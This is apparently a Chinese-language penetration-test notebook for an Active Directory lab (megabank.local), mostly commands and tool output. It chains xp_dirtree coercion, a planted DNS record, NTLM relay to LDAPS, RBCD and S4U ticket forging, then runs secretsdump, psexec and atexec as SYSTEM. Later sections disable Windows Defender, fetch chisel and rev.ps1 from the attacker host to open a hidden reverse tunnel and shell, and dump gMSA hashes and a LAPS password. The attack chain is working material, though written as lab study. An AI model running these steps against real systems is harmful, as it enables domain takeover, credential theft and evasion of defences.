#### 测试分析
##### 请求监听
1. Admin/Admin 这个低权限 SQL 登录，**确实能执行** xp_dirtree
2. xp_dirtree '\\10.10.16.14@80\probe' 会让 SERVER04 **真的去请求你的 HTTP/WebDAV 监听**

证据就是 Kali 上看到了：

```plain
(HTTP): Client requested path: /probe
```

##### 失败分析
所以现在失败的点**不是强制访问失败**，而是：

**relay 还没拿到我们想要的那种可中继认证。**

还有这句也很重要：

```plain
[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)
```

意思是：

+ SERVER04 同时还打到了你这边的 SMB
+ 但这条 SMB 认证要求 signing，所以**这条 SMB -> LDAP relay 不行**
+ 不代表整条思路不行

##### 可信主机
**为什么建议换成域内主机名，而不是裸 IP**  
因为你现在用的是：

```plain
\\10.10.16.14@80\probe
```

这已经证明了“访问会出去”。  
但下一步我们要的是：

**让 Windows 更像是在访问一个“域内可信主机名”**，这样更容易带着机器账户/集成认证过来，而不是只是简单请求路径

##### 后续步骤
**用**** ****svc_ata**** ****往**** ****megabank.local**** ****里加一个 DNS A 记录，指向你的 Kali。**

比如加一个名字：

```plain
heathcliff.megabank.local -> 10.10.16.14
```

然后再触发：

```plain
EXEC master.sys.xp_dirtree '\\heathcliff@80\probe',1,1
```

或者更稳一点：

```plain
EXEC master.sys.xp_dirtree '\\heathcliff.megabank.local@80\probe',1,1
```

#### 添加DNS
> 项目地址：[https://github.com/dirkjanm/krbrelayx/blob/aef69a7e/dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/aef69a7e/dnstool.py)
>
> --zone megabank.local   明确指定要操作的 DNS 区域：megabank.local
>
> -r heathcliff    record name（节点名）最终完整 FQDN 是：heathcliff.megabank.local
>
> -a add  action = add  表示：新增一个 dnsNode 对象
>
> -t A  记录类型：A  即：IPv4 主机记录(A record -> 10.10.16.14)
>
> -d 10.10.16.14   A 记录对应的数据。即：10.10.16.14(攻击机)
>
> 192.168.24.10 最后这个是：域控 / DNS 服务器 IP  工具通过 LDAP 连接它。
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q python3 /home/kali/Desktop/tools/krbrelayx/dnstool.py \
  -u 'MEGABANK\svc_ata' \
  -p 'Password123' \
  --tcp \
  --zone megabank.local \
  -r heathcliff \
  -a add \
  -t A \
  -d 10.10.16.14 \
  192.168.24.10
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

#### svc_ata分析
##### `svc_ata` 已经能做什么
前面的枚举已经给出了三条很关键的事实：

1. 它能通过 **SMB** 认证到 `PRIMARY / SERVER04 / SERVER05`
2. 它能通过 **LDAP** 认证到 `PRIMARY`
3. 它自己带着一个 **SPN**：`HTTP/server02`

前面已经验证过：

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Aptlabs/blood]
└─# proxychains -q nxc smb 192.168.24.10 -u svc_ata -p 'Password123' -d MEGABANK
proxychains -q nxc smb 192.168.24.112 -u svc_ata -p 'Password123' -d MEGABANK
proxychains -q nxc smb 192.168.24.118 -u svc_ata -p 'Password123' -d MEGABANK

SMB         192.168.24.10   445    PRIMARY          [+] MEGABANK\svc_ata:Password123
SMB         192.168.24.112  445    SERVER04         [+] MEGABANK\svc_ata:Password123
SMB         192.168.24.118  445    SERVER05         [+] MEGABANK\svc_ata:Password123
```

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Aptlabs/blood]
└─# proxychains -q nxc ldap 192.168.24.10 -u svc_ata -p 'Password123' -d MEGABANK

LDAP        192.168.24.10   389    PRIMARY          [+] MEGABANK\svc_ata:Password123
```

以及前面的 PowerView / LDAP 枚举：

> svc_ata 具有 servicePrincipalName（HTTP/server02），说明它是一个服务账号而非普通用户账号。
>
> 这一点首先使其成为 Kerberoasting 的有效目标；其次，带 SPN 的服务账号也常常是 Kerberos delegation / S4U 利用链中的核心主体，因此在枚举出 svc_ata 后，应进一步关注其是否具备委派相关属性，或能否在后续实测中成功完成 S4U 票据申请。
>

```plain
samaccountname       : svc_ata
serviceprincipalname : HTTP/server02
```

##### 为什么“有 SPN”会联想S4U/委派
因为 S4U 本质上是：

+ 某个**服务**代表用户向 KDC 请求票据
+ 而在 Kerberos 里，“服务”通常就是靠 **SPN** 来标识的

所以一个普通用户如果没有 SPN，你一般不会优先想到它去做 S4U。  
但一个用户对象一旦带了 SPN，比如：HTTP/server02

那它就从“普通域用户”变成了“服务主体候选人”，这就是为什么攻击思路会自然转到：

+ Kerberoast 它
+ 观察它的 delegation 属性
+ 看它能不能成为 S4U 的利用主体

##### `svc_ata` 还不能做什么
但同样重要的是：**不要因为拿到一个域账号就误以为已经到位了。**

我们前面也已经验证过：

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Aptlabs/blood]
└─# proxychains -q nxc winrm 192.168.24.112 -u svc_ata -p 'Password123' -d MEGABANK
proxychains -q nxc winrm 192.168.24.118 -u svc_ata -p 'Password123' -d MEGABANK

WINRM       192.168.24.112  5985   SERVER04         [-] MEGABANK\svc_ata:Password123
WINRM       192.168.24.118  5985   SERVER05         [-] MEGABANK\svc_ata:Password123
```

> 所以 `svc_ata` 这个阶段的真实处境是：
>
> + **能认证**
> + **能查 LDAP**
> + **能碰 SMB**
> + **但还不能直接远程拿交互式高权限**
>
> 这意味着：
>
> + 它足够用来**继续做域内权限放大**
>

#### RBCD
##### 思路联想
`RBCD` 不是凭空冒出来的技巧，而是被当前枚举结果“推出来”的。

这一阶段之所以 `RBCD` 非常合理，是因为我们已经同时拿到了它成立所需的几个条件：

1. **我们控制了一个带 SPN 的域账号**：`svc_ata`  
这意味着它可以参与 `S4U2Self / S4U2Proxy`
2. **我们能让 **`SERVER04`** 向外发起认证**  
这是通过 SQL 的 `xp_dirtree` + WebDAV 试出来的，不是猜的
3. **我们能把这次认证 relay 到 **`PRIMARY`** 的 LDAPS**
4. **我们当前真正想打的目标就是 **`SERVER04`** 本机**

把这几个条件拼起来，最自然的目标就变成：

+ **把 **`SERVER04$`** 这个计算机对象作为 RBCD 的目标对象**
+ **把 **`svc_ata`** 作为被授权的代理方**

##### 监听测试（失败）
Kali 监听：

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -t ldaps://192.168.24.10 \
  --delegate-access \
  -i \
  -smb2support

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Servers started, waiting for connections
```

在 `SERVER04 / s.helmer` 的 shell 里执行：

```plain
osql -S .\RE7_MS -U Admin -P Admin -Q "EXEC master.sys.xp_dirtree '\\heathcliff.megabank.local@80\a',1,1"
```

`ntlmrelayx` 只看到：

```plain
[*] (HTTP): Client requested path: /a
[*] (HTTP): Client requested path: /a
[*] (HTTP): Client requested path: /a
[*] (HTTP): Client requested path: /a
```

> 这个现象很关键。
>
> 它说明：
>
> + **SQL 的 **`xp_dirtree`** 触发 WebDAV 外连这件事已经成立**
> + 问题不在“能不能访问出去”
> + 问题在“Windows 是否把这个目标视作足够可信，从而自动送机器认证”
>

##### 无点主机名
> Windows 对“无点主机名”的自动 Intranet 认证通常更友好。
>
> 所以第二次我把目标从：
>
> `\\moriarty.megabank.local@80\a`
>
> 改成：
>
> `\\moriarty@80\a`
>
> 背后的判断是：
>
> 1. `moriarty` 依然能通过域后缀解析到我们刚加的 `moriarty.megabank.local`
> 2. 但对 WebClient / Intranet 自动认证来说，“无点主机名”更容易触发集成认证
> 3. 这是典型的 **路径没问题，认证语义要改** 的场景
>

在 `SERVER04` 上执行：

```plain
osql -S .\RE7_MS -U Admin -P Admin -Q "EXEC master.sys.xp_dirtree '\\heathcliff@80\a',1,1"
```

这次 `ntlmrelayx` 日志明显不同：

```plain
[*] (HTTP): Connection from 10.10.110.50 controlled, attacking target ldaps://192.168.24.10
[*] (HTTP): Client requested path: /a
[*] (HTTP): Authenticating connection from MEGABANK/SERVER04$@10.10.110.50 against ldaps://192.168.24.10 SUCCEED [1]
[*] ldaps://MEGABANK/SERVER04$@192.168.24.10 [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as MEGABANK/SERVER04$
[*] (HTTP): Client requested path: /a
[*] (HTTP): Client requested path: /a
[*] All targets processed!
[*] (HTTP): Connection from 10.10.110.50 controlled, but there are no more targets left!
```

> 到这里，RBCD 这条路已经真正打通：
>
> + `SERVER04$` 的机器认证被成功 relay 到 `ldaps://192.168.24.10`
> + `ntlmrelayx` 为我们开出了本地交互式 LDAP shell 位于127.0.0.1:11000 通过nc连接即可
> + 暂时“借用了”`SERVER04$`  对域控 LDAP 的身份
> + 我能用 SERVER04$ 这台机器在域里本来就有的权限，去改 AD 里的某些属性
> + 接下来要做的就是把 `svc_ata` 写进 `SERVER04$` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 把 svc_ata 加进 SERVER04 允许代理访问自己的名单
>

##### 本地连接 LDAP shell
###### 方式一
> 键入set_rbcd SERVER04$ svc_ata 
>
> 把 svc_ata 写进 SERVER04$ 的 msDS-AllowedToActOnBehalfOfOtherIdentity
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# nc 127.0.0.1 11000

# set_rbcd SERVER04$ svc_ata

Type help for list of commands
Found Target DN: CN=SERVER04,CN=Computers,DC=megabank,DC=local
Target SID: S-1-5-21-997099906-443949041-4154774969-1107

Found Grantee DN: CN=svc_ata,CN=Users,DC=megabank,DC=local
Grantee SID: S-1-5-21-997099906-443949041-4154774969-1109
Delegation rights modified successfully!
svc_ata can now impersonate users on SERVER04$ via S4U2Proxy
```

###### 方式二
> 往那个 LDAP shell 里输入一条命令：set_rbcd SERVER04$ svc_ata
>
> **给 ****SERVER04**** 这台机器配置 RBCD，让 ****svc_ata**** 可以代表其他用户访问它。**
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# printf 'set_rbcd SERVER04$ svc_ata\n' | nc 127.0.0.1 11000

Type help for list of commands

# Found Target DN: CN=SERVER04,CN=Computers,DC=megabank,DC=local
Target SID: S-1-5-21-997099906-443949041-4154774969-1107

Found Grantee DN: CN=svc_ata,CN=Users,DC=megabank,DC=local
Grantee SID: S-1-5-21-997099906-443949041-4154774969-1109
Delegation rights modified successfully!
svc_ata can now impersonate users on SERVER04$ via S4U2Proxy
```

> 到这里可以明确下结论：
>
> + `svc_ata` 本身并不是本地管理员
> + 但它有 SPN，可用于 S4U
> + 通过 `SERVER04$ -> svc_ata` 的 RBCD 关系，我们已经把它变成了一个**可以代表其他用户访问 **`SERVER04`** 服务 SPN 的跳板账号**
>
> 这句话必须彻底理解：
>
> + `RBCD` 成功后，并不是“`svc_ata` 直接变管理员”
> + 而是“`svc_ata` 获得了**代表别的用户访问 **`SERVER04`** 某个服务 SPN** 的能力”
>
> 也正因为如此，后面的核心动作才会是：
>
> 1. 选一个更值得伪造的用户
> 2. 用 `getST.py` 代表它去申请 `cifs/server04` 的票据
> 3. 再拿这张票据去驱动 `secretsdump.py / psexec.py / atexec.py`
>

#### 申请票据(失败)
> RBCD 成功后，下一步就是用 `svc_ata` 去做 S4U，伪造成更适合打 `SERVER04` 的账号。
>
> 我这里首先尝试的是：
>
> `sql_admin`
>
> 选择理由：
>
> 1. 目标机本身就是 SQL 服务器
> 2. 这个域用户的命名语义非常贴近目标业务
> 3. 如果它真的是 SQL 相关运维/admin 账号，那么本地管理员概率很高
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q getST.py \
  -spn cifs/server04.megabank.local \
  -impersonate sql_admin \
  -dc-ip 192.168.24.10 \
  'megabank.local/svc_ata:Password123'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

> 这里失败原因不是 RBCD 没生效，而是 **Kali 的系统时间和 **`PRIMARY`** 的 Kerberos 时间差太大**。
>
> 这类错误如果不先修时间，后面所有 `getST.py / getTGT / S4U` 都会继续失败。
>

#### LDAP读取时间
> 直接用 LDAP rootDSE 读取 DC 当前时间。
>
> 这么做的好处是：
>
> 1. 不依赖 Kerberos，本身就不会再受 skew 影响
> 2. 读到的是 DC 当前真实时间
> 3. 调表一次就够，不会来回试错
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q ldapsearch \
  -x \
  -H ldap://192.168.24.10 \
  -D 'svc_ata@megabank.local' \
  -w 'Password123' \
  -b '' \
  -s base \
  currentTime
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: currentTime 
#

#
dn:
currentTime: 20260407101438.0Z

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

把 Kali 时间调到 DC 附近：

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# date -u -s '2026-04-07 10:14:50'
2026年 04月 07日 星期二 10:14:50 UTC
```

#### getST
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q getST.py \
  -spn cifs/server04.megabank.local \
  -impersonate sql_admin \
  -dc-ip 192.168.24.10 \
  'megabank.local/svc_ata:Password123'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating sql_admin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in sql_admin@cifs_server04.megabank.local@MEGABANK.LOCAL.ccache
```

#### 关系链
> 1. **RBCD**  
把 `SERVER04$` 的“可被代理访问权”交给 `svc_ata`
> 2. `getST.py`  
负责把这份能力真正转成票据
> 3. `sql_admin`  
是我们选择拿来伪造的那个“更高价值用户”
> 4. `cifs/server04`  
是我们真正需要的服务票据目标，因为后面所有 SMB 系工具都靠它
> 5. `secretsdump.py / psexec.py / atexec.py`  
则是拿着这张 `cifs/server04` 票据去真正落地执行
>
> 所以顺序一定要理解成：
>
> + **先有 RBCD**
> + 再有 **S4U 能力**
> + 再通过 `getST.py` 生成 `sql_admin -> cifs/server04` 的票据
> + 最后才轮到 `psexec.py / atexec.py / secretsdump.py`
>
> 如果没有前面的 RBCD，后面的 `getST.py` 根本拿不到能用的服务票据；  
如果没有拿到 `cifs/server04` 票据，后面的 SMB 型利用工具也就无从谈起。
>

> 有了这张票据后，下一步理论上有几个方向：
>
> 1. `secretsdump.py -k -no-pass`
> 2. `psexec.py -k -no-pass`
> 3. `atexec.py -k -no-pass`
>
> 我这里三个都试了，但 live 环境里的“可用性表现”并不一样。
>

### secretsdump.py（缓慢)
> 这一步已经说明：
>
> + `sql_admin` **对 SERVER04 确实具备本地管理员能力**
> + 不然它不可能拉起 `RemoteRegistry`、读到 `bootKey`、并进入本地 SAM dump 阶段
> + 但是进度非常慢，这里先挂起
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q secretsdump.py -k -no-pass -dc-ip 192.168.24.10 megabank.local/sql_admin@server04.megabank.local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0922e84f770813cc0c25d4ee79a9c76c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain/username:hash)

[*] NL$KM

 0030   84 2F BB 0B A9 92 C5 00  8D CC AD 25 44 B3 3E 85   ./.........%D.>.
NL$KM:6f2e5ac3a55d2293688904ee204e5520c5b027d5785b8896eb4ac2c17e56f0b2aed42c6c1ecc8d78bb7ed2b5f7239d05842fbb0ba992c5008dccad2544b33e85

```

### psexec.py（不稳定)
> `psexec.py` 这边也已经能明确说明“可执行服务创建”，但输出回传在当前代理链/现场下不稳定
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# export KRB5CCNAME=/home/kali/Desktop/htb/Aptlabs/sql_admin@cifs_server04.megabank.local@MEGABANK.LOCAL.ccache 
             
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q psexec.py -k -no-pass -dc-ip 192.168.24.10 megabank.local/sql_admin@server04.megabank.local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on server04.megabank.local.....

[*] Opening SVCManager on server04.megabank.local.....
[*] Creating service lgPA on server04.megabank.local.....
[*] Starting service lgPA.....
[*] Opening SVCManager on server04.megabank.local.....
[-] Error performing the uninstallation, cleaning up
```

### atexec.py
> 既然目标是尽快验证本地管理员并拿 flag，那么：
>
> + `secretsdump.py` 已经证明权限够
> + `psexec.py` 已经证明服务创建可行
> + 那么此时应该选一个**最容易稳定拿输出**的工具
>
> 在这个现场里，`atexec.py` 明显就是更稳的选择。
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q atexec.py -k -no-pass \
  megabank.local/sql_admin@server04.megabank.local \
  'cmd.exe /c whoami'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \lXiobFqH
[*] Running task \lXiobFqH
[*] Deleting task \lXiobFqH
[*] Attempting to read ADMIN$\Temp\lXiobFqH.tmp
nt authority\system
```

```plain
  megabank.local/sql_admin@server04.megabank.local \
  'cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
```

```plain
powershell.exe -NoP -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"
cmd /c "sc query WinDefend"
cmd /c "sc stop WinDefend"
cmd /c "sc config WinDefend start= disabled"
cmd /c "sc query WinDefend"
```

##### server05.megabank.local-192.168.24.118
> server03.cubano.local -> fs1_msa$
>
> server05.cubano.local -> backup$
>
> 它们的 distinguishedName 均位于：
>
> CN=Managed Service Accounts,DC=megabank,DC=local
>
> 这说明megabank 域中托管服务账号对象的 dNSHostName 指向了 cubano.local 命名空间
>
> 当前阶段，cubano.local 以 gMSA / dNSHostName 痕迹的形式出现，但既没有出现在 nltest trust 中，也无法直接通过当前 DNS 解析，因此暂时更像是目录中的命名/服务残留线索，而不是立即可交互的下一跳
>

#### ms-Mcs-AdmPwd
> 旧版 Microsoft LAPS 存放本地管理员密码的属性
>
> 这意味着，一旦你**对某台机器对象有读取权限**，读到的是：**可以直接尝试登录那台机器的本地管理员明文密码。**
>

```plain
PS C:\> Get-DomainComputer -Domain megabank.local -Server 192.168.24.10 -LDAPFilter '(ms-Mcs-AdmPwd=*)' -Properties samaccountname,'ms-Mcs-AdmPwd' | Select-Object samaccountname,'ms-Mcs-AdmPwd'

samaccountname ms-mcs-admpwd    
-------------- -------------    
SERVER03$      v881152b6ab9uuIMV
```

### 搭建隧道:1082
#### upload
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/chisel]
└─# updog -p 8888
[+] Serving /home/kali/Desktop/tools/chisel on 0.0.0.0:8888...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.                                                                                          
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://61.139.2.134:8888
Press CTRL+C to quit
```

```plain
powershell -c "iwr http://10.10.16.14:8888/chisel.exe -OutFile C:\ProgramData\chisel.exe"
```

#### run:1082
```plain
Start-Process powershell.exe "-WindowStyle Hidden -Command `"while(`$true){C:\ProgramData\chisel.exe client 10.10.16.14:9999 R:1082:socks; sleep 5}`""
```

```plain
  -p 'v881152b6ab9uuIMV' \
  -a ntlm
```

```plain
opsr(auto)> function Get-Flag { powershell.exe -c "iwr http://10.10.16.14:9988/rev.ps1 -OutFile C:\ProgramData\rev.ps1; powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\rev.ps1" | Out-Host }
```

#### ntlmrelayx
##### 指令
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q /usr/bin/python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://192.168.24.10
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack WINRMS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

##### 参数
| 参数 | 作用 |
| --- | --- |
| `**-t ldaps://192.168.24.10**` | 指定 NTLM 身份验证凭据要**中继到的目标**，这里是一个 LDAPS（LDAP over SSL/TLS）服务，通常指向域控制器。 |
| `**--dump-gmsa**` | 激活特定攻击模块。成功中继后，它会从目标 LDAP 读取并解码所有 gMSA 账户的 `msDS-ManagedPassword`<br/> 属性，以获取其明文密码。 |
| `**--no-dump**` | **关键安全/效率参数**，作用是**禁止**`ntlmrelayx.py`<br/> 执行其**默认的数据导出行为**（如导出域内用户、组、计算机等完整信息），只执行由 `--dump-gmsa`<br/> 指定的特定任务。 |
| `**--no-da**` | 禁止尝试**枚举域管理员（Domain Admins）** 组成员。 |
| `**--no-acl**` | 禁止**枚举和解析对象的访问控制列表（ACL）**，避免不必要的 LDAP 查询，减少攻击噪音。 |
| `**--no-validate-privs**` | 禁止**验证当前中继账户所拥有的权限**。此参数可加快攻击流程并减少日志。 |
| `**-debug**` | 开启**调试模式**，会输出非常详细的程序运行信息，用于故障排查和观察攻击细节。 |
| `**-q**`<br/> (在 `proxychains`<br/> 命令中) | 该参数属于 `proxychains`<br/>代表"安静模式"，会抑制其自身的连接日志输出，使界面更清爽。 |


#### Invoke-WebRequest
```plain
Invoke-WebRequest -Uri "http://10.10.16.14" -UseDefaultCredentials
```

```plain
[*] Servers started, waiting for connections

[*] (HTTP): Client requested path: /

[*] ldaps://MEGABANK/FS1_MSA$@192.168.24.10 [1] -> backup$:::722d9aa661d3fb35e220cf1ed9d30163

```

### netexec
> 可以发现俩个账号凭据都有效
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q netexec smb 192.168.24.10 -u 'fsl_msa$' -H acf891b6b630d1689cce92a4808446ef
SMB         192.168.24.10   445    PRIMARY          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIMARY) (domain:megabank.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.24.10   445    PRIMARY          [+] megabank.local\fsl_msa$:acf891b6b630d1689cce92a4808446ef (Guest)
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q netexec smb 192.168.24.10 -u 'backup$' -H 722d9aa661d3fb35e220cf1ed9d30163
SMB         192.168.24.10   445    PRIMARY          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIMARY) (domain:megabank.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.24.10   445    PRIMARY          [+] megabank.local\backup$:722d9aa661d3fb35e220cf1ed9d30163
```

| 账户 | 哈希 | 认证结果 | 权限级别 | 可利用性 |
| --- | --- | --- | --- | --- |
| `backup$` | `722d9aa661d3fb35e220cf1ed9d30163` | ✅ 成功 | **普通域用户** | 低（仅可读取 `SYSVOL`<br/>/`NETLOGON`<br/>） |
| `fs1_msa$` | `acf891b6b630d1689cce92a4808446ef`<br/> 等 | ✅ 成功 (Guest) | **来宾** | 极低 |


### bloodhound
> 通过bloodhound对俩个账号价值进行比对
>

| 属性 | `BACKUP$` | `FS1_MSA$` | 安全含义 |
| --- | --- | --- | --- |
| **Tier Zero** | ✅ **TRUE** | ❌ FALSE | 表明该账户是**第 0 层资产**，即拥有直接控制域控制器（DC）或整个域的最高权限 |
| **Admin Count** | ✅ **TRUE** | ❌ FALSE | 表示该账户当前或曾经是**受保护组**的成员（如 Domain Admins, Administrators, Backup Operators 等），其访问令牌中包含高权限 SID |
| **Owner SID** | `512`<br/> (Domain Admins) | `512`<br/> (Domain Admins) | 创建者均为域管理员组，但 `Admin Count`<br/> 表明 `BACKUP$`<br/>**本身**继承了高权限。 |


### 横向移动
#### DCSync（失败）
> `rpc_s_access_denied (0x5)`：账户无权调用 `DRSUAPI`接口进行域复制
>
> `ERROR_DS_DRA_BAD_DN`：由于权限不足，后续操作返回了无效的目录对象名称
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
```

#### reg
> 注册表路径 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` 是 Windows 系统中**控制用户登录行为的关键配置单元**，也是攻击者常用来实现**持久化**或**提取自动登录凭据**的目标位置
>
> 结论：域控配置了**域账户 **`**remote_admin@megabank.local**`** 的自动登录**。
>

##### 自动登录用户
> 验证 backup$ 能不能通过远程注册表读到 Winlogon 的敏感值
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q reg.py 'MEGABANK/backup$@primary.megabank.local' -hashes ':722d9aa661d3fb35e220cf1ed9d30163' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -v DefaultUserName

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
        DefaultUserName REG_SZ   remote_admin                                         
```

```plain
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
        DefaultDomainName       REG_SZ   megabank.local
```

##### 自动登录密码（失败）
> 读取失败，说明 backup$ 的价值更偏向“读敏感配置/策略”，下一步会自然转去 SYSVOL/GptTmpl.inf
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q reg.py 'MEGABANK/backup$@primary.megabank.local' -hashes ':722d9aa661d3fb35e220cf1ed9d30163' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -v DefaultPassword

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
[-] RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
```

#### SYSVOL / NETLOGON
> `backup$` 作为域用户，确实有权限读取 `SYSVOL` 和 `NETLOGON` 共享。这两个共享中常包含：
>
> + **组策略首选项 (GPP) 密码**：存储于 `Groups.xml`、`Services.xml`、`ScheduledTasks.xml` 等文件中，包含 `cpassword` 字段（AES-256 加密，但密钥公开，可轻松解密）。
> + **登录脚本**：批处理、PowerShell 或 VBS 脚本中可能硬编码凭据。
> + **组策略模板文件** (`GptTmpl.inf`)：包含本地账户密码策略、本地管理员组配置等，偶尔会泄露明文密码。
>

##### `smbclient.py` 
> `{31B2F340-016D-11D2-945F-00C04FB984F9}`是默认域策略的GUID
>
> `{6AC1786C-016F-11D2-945F-00C04fB984F9}`是默认域控制器策略的GUID
>

##### GptTmpl
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Aptlabs/backup]
└─# rg -n -C 2 '^\[(Group Membership|Privilege Rights)\]|S-1-5-32-544|S-1-5-32-551|S-1-5-32-555|remote_admin|backup\$|sql_admin|svc_ata' GptTmpl_31B2F340.inf GptTmpl_6AC1786C.inf

GptTmpl_6AC1786C.inf
9-signature="$CHICAGO$"
10-Revision=1
11:[Privilege Rights]
12-SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
13-SeAuditPrivilege = *S-1-5-20,*S-1-5-19
14:SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
15:SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544,*S-1-5-21-997099906-443949041-4154774969-1120
16:SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
17:SeCreatePagefilePrivilege = *S-1-5-32-544
